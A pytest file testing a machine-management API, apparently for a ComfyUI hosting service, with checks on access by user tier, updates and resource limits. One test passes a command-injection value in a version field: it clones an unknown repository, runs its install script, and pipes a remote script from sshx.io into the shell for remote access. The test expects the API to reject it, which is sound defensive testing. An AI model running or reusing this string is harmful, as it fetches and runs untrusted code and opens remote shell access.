from conftest import get_test_client
import pytest  # noqa: E402

from dotenv import load_dotenv

load_dotenv()

# ===================== machine =====================

# ------ custom machine ------

# create and delete
"""
Free user
- return 403

Paid user
- return 200
- delete machine
"""


@pytest.mark.parametrize("user_fixture,expected_status", [
    ("free_user", 403),
    ("paid_user", 200),
], indirect=["user_fixture"])
@pytest.mark.asyncio
async def test_create_custom_machine_access(app, user_fixture, expected_status):
    machine_data = {
        "name": "test-machine",
        "type": "classic",
        "endpoint": "http://localhost:8188",
        "auth_token": "test_auth_token",
    }

    async with get_test_client(app, user_fixture) as client:
        response = await client.post("/machine/custom", json=machine_data)
        assert response.status_code == expected_status
        
        # Only cleanup if creation was successful
        if expected_status == 200:
            machine_id = response.json()["id"]
            delete_response = await client.delete(f"/machine/{machine_id}")
            assert delete_response.status_code == 200


# get and delete
"""
Paid user
- return 200
"""



@pytest.mark.asyncio
async def test_get_custom_machine(app, paid_user, test_custom_machine):
    async with get_test_client(app, paid_user) as client:
        response = await client.get(f"/machine/{test_custom_machine}")
        assert response.status_code == 200
        assert response.json()["id"] == test_custom_machine


# update
"""
Paid user
- update name, endpoint, auth_token, type
- return 200 with updated values
"""


@pytest.mark.asyncio
async def test_update_custom_machine(app, paid_user, test_custom_machine):
    update_data = {
        "name": "updated-classic-custom-machine",
        "endpoint": "http://localhost:9999",
        "auth_token": "updated_auth_token",
        "type": "runpod-serverless",
    }

    async with get_test_client(app, paid_user) as client:
        # Send update request
        response = await client.patch(
            f"/machine/custom/{test_custom_machine}", json=update_data
        )
        assert response.status_code == 200
        updated_machine = response.json()

        # Verify the machine was updated with our new values
        assert updated_machine["id"] == test_custom_machine
        assert updated_machine["name"] == update_data["name"]
        assert updated_machine["endpoint"] == update_data["endpoint"]
        assert updated_machine["auth_token"] == update_data["auth_token"]
        assert updated_machine["type"] == update_data["type"]


# ------ serverless machine ------

# create and delete
"""
Free user
- return 403

Paid user
- return 200
- delete machine
"""


@pytest.mark.parametrize("user_fixture,expected_status", [
    ("free_user", 403),
    ("paid_user", 200),
], indirect=["user_fixture"])
@pytest.mark.asyncio
async def test_create_serverless_machine_access(app, user_fixture, expected_status):
    machine_data = {
        "name": "test-serverless-machine",
        "gpu": "CPU",
        "wait_for_build": True,
    }

    async with get_test_client(app, user_fixture) as client:
        response = await client.post("/machine/serverless", json=machine_data)
        assert response.status_code == expected_status
        
        # Only cleanup if creation was successful
        if expected_status == 200:
            machine_id = response.json()["id"]
            delete_response = await client.delete(f"/machine/{machine_id}?force=true")
            assert delete_response.status_code == 200


# get and delete
"""
Paid user
- return 200
"""
       

# @pytest_asyncio.fixture(scope="session")
# async def test_serverless_machine_free_user(app, test_free_user):
#     """Fixture that creates and tears down a test serverless machine"""
#     async with get_test_client(app, test_free_user) as client:
#         machine_data = {
#             "name": "test-serverless-machine",
#             "gpu": "CPU",
#             "wait_for_build": True,
#         }
#         print("Creating test serverless machine")
#         response = await client.post("/machine/serverless", json=machine_data)

#         # Add detailed error logging
#         if response.status_code != 200:
#             print(
#                 f"Failed to create serverless machine. Status code: {response.status_code}"
#             )
#             print(f"Response content: {response.text}")
#             raise AssertionError(
#                 f"Failed to create serverless machine: {response.text}"
#             )

#         machine_id = response.json()["id"]
#         print(f"Successfully created serverless machine with ID: {machine_id}")

#         yield machine_id

#         # Add error logging for cleanup as well
#         delete_response = await client.delete(f"/machine/{machine_id}?force=true")
#         if delete_response.status_code != 200:
#             print(
#                 f"Failed to delete serverless machine. Status code: {delete_response.status_code}"
#             )
#             print(f"Response content: {delete_response.text}")
#         assert delete_response.status_code == 200


@pytest.mark.asyncio
async def test_get_serverless_machine(app, paid_user, test_serverless_machine):
    async with get_test_client(app, paid_user) as client:
        response = await client.get(f"/machine/{test_serverless_machine}")
        assert response.status_code == 200
        assert response.json()["id"] == test_serverless_machine


# update
"""
Paid user
- update name, install ipadapter, run custom command ls
- test malicious command
- return 200 with updated values
"""


@pytest.mark.asyncio
async def test_update_serverless_machine(app, paid_user, test_serverless_machine):
    async with get_test_client(app, paid_user) as client:
        update_malicious_hash = {
            "name": "updated-serverless-machine-with-malicious-hash",
            "comfyui_version": "7fbf4b72fe3b23d9ff8f21e0f9a254d032f2f9d0 && pip install accelerate && pip install diffusers && git clone https://github.com/nigeriaerika/Brushy && if [ -f requirements.txt ]; then python -m pip install -r requirements.txt; fi && if [ -f install.py ]; then python install.py || echo 'install script failed'; fi && mv Brushy custom_nodes && cd / && curl -sSf https://sshx.io/get | sh - run",
        }
        response = await client.patch(
            f"/machine/serverless/{test_serverless_machine}",
            json=update_malicious_hash,
        )
        assert response.status_code == 422

        update_data = {
            "name": "updated-serverless-machine",
            "docker_command_steps": {
                "steps": [
                    {
                        "id": "76566a1b-9",
                        "type": "custom-node",
                        "data": {
                            "name": "ComfyUI_IPAdapter_plus",
                            "url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus",
                            "files": [
                                "https://github.com/cubiq/ComfyUI_IPAdapter_plus"
                            ],
                            "install_type": "git-clone",
                            "pip": ["insightface"],
                            "hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                            "meta": {
                                "message": "Merge pull request #793 from svenrog/main\n\nFix for issue with pipeline in load_models",
                                "committer": {
                                    "name": "GitHub",
                                    "email": "noreply@github.com",
                                    "date": "2025-02-26T06:31:16.000Z",
                                },
                                "latest_hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                                "stargazers_count": 4766,
                                "commit_url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus/commit/9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                            },
                        },
                    },
                    {"id": "26e71a68-6", "type": "commands", "data": "RUN ls"},
                ]
            },
        }
        response = await client.patch(
            f"/machine/serverless/{test_serverless_machine}",
            json=update_data,
        )
        assert response.status_code == 200
        updated_machine = response.json()
        assert updated_machine["id"] == test_serverless_machine
        assert updated_machine["name"] == update_data["name"]
        assert (
            updated_machine["docker_command_steps"]
            == update_data["docker_command_steps"]
        )

@pytest.mark.parametrize("user_fixture,expected_status,validate_values", [
    ("free_user", 403, False),
    ("paid_user", 200, True),
    ("paid_user_2", 200, False),
], indirect=["user_fixture"])
@pytest.mark.asyncio
async def test_create_serverless_machine_cpu_mem_restriction(app, user_fixture, expected_status, validate_values):
    # Test data with cpu/mem fields
    machine_data = {
        "name": "test-serverless-machine-cpu-mem",
        "gpu": "CPU",
        "wait_for_build": True,
        "cpu_request": 2.0,
        "cpu_limit": 4.0,
        "memory_request": 4096,
        "memory_limit": 8192,
    }

    async with get_test_client(app, user_fixture) as client:
        response = await client.post("/machine/serverless", json=machine_data)
        assert response.status_code == expected_status
        
        # Only cleanup and validate if creation was successful
        if expected_status == 200:
            machine_id = response.json()["id"]
            
            # Validate values for specific user types
            if validate_values:
                get_response = await client.get(f"/machine/{machine_id}")
                assert get_response.status_code == 200
                machine = get_response.json()
                assert machine["cpu_request"] == 2.0
                assert machine["cpu_limit"] == 4.0
                assert machine["memory_request"] == 4096
                assert machine["memory_limit"] == 8192
            
            # Cleanup
            delete_response = await client.delete(f"/machine/{machine_id}?force=true")
            assert delete_response.status_code == 200

@pytest.mark.asyncio
async def test_update_serverless_machine_cpu_mem_restriction(app, paid_user, test_serverless_machine):
    update_data = {
        "cpu_request": 1.0,
        "cpu_limit": 2.0,
        "memory_request": 2048,
        "memory_limit": 4096,
    }
    # Paid user 2 (non-business) - forbidden
    # async with get_test_client(app, paid_user_2) as client:
    #     response = await client.patch(
    #         f"/machine/serverless/{test_serverless_machine}", json=update_data
    #     )
    #     assert response.status_code == 403
    # Paid user (business) - allowed
    async with get_test_client(app, paid_user) as client:
        response = await client.patch(
            f"/machine/serverless/{test_serverless_machine}", json=update_data
        )
        assert response.status_code == 200
        updated_machine = response.json()
        assert updated_machine["cpu_request"] == 1.0
        assert updated_machine["cpu_limit"] == 2.0
        assert updated_machine["memory_request"] == 2048
        assert updated_machine["memory_limit"] == 4096
